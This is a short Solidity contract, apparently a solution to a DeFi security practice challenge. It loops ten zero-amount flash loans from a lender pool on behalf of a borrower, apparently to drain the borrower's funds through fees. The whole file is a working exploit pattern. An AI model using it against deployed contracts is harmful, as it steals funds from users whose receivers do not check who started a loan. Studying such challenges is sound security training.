// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;
import "./NaiveReceiverLenderPool.sol";
contract AttackNaive{
    function flashLoanAttack(NaiveReceiverLenderPool pool, address borrower) external{
        for(uint i = 0; i < 10; i++){
            pool.flashLoan(borrower, 0);
        }
    }
}